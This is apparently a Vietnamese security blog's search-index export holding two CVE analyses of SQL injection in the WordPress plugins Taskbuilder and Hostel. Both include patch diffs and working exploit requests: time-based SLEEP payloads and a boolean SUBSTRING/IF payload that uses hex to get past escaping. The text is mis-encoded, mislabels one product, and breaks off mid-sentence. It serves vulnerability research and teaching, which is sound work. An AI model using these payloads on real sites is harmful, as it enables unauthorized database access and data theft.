[{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± 